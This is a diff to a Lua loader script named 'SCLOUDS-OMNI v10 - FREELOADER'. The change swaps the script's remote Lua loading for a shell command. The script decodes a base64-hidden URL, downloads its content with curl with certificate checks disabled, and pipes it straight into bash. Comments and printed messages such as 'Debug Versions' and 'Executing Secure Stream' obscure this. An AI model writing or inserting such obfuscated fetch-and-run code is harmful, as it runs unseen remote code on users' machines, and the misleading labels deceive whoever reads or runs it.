@@ -1,5 +1,5 @@
 -- =============================================================
--- 🚀 SCLOUDS-OMNI v10 - FREELOADER (WITHOUT INPUT)
+-- 🚀 SCLOUDS-OMNI v10 - FREELOADER 
 -- =============================================================
 
 local function decode(str)
@@ -15,21 +15,17 @@ local function decode(str)
     end))
 end
 
--- URL & UA Encrypted
+-- Debug Versions
 local target = decode("aHR0cHM6Ly9zZXR1cC5yZHAubjhuLmt1bWEuYXBpLnNjbG91ZHMud2ViLmlkL2FwaS9zZXR1cA==")
 local ident  = decode("U2Nsb3Vkcy1PbW5pLXYxMQ==")
 
-local pipe = io.popen("curl -sL -k -A '" .. ident .. "' '" .. target .. "'")
-if pipe then
-    local content = pipe:read("*a")
-    pipe:close()
-    
-    if content and content ~= "" then
-        local run = loadstring(content)
-        if run then
-            run()
-        else
-            print("\27[31m[ERROR]\27[0m Failed To Load Encryption Files.")
-        end
-    end
+-- Automatic Executed The API
+local cmd = "curl -sL -k -A '" .. ident .. "' '" .. target .. "' | bash"
+
+print("\27[1;36m[ScloudsOmni]\27[0m Executing Secure Stream...")
+
+local success = os.execute(cmd)
+
+if not success then
+    print("\27[31m[ERROR]\27[0m Failed To Load Freeloader.sh .")
 end
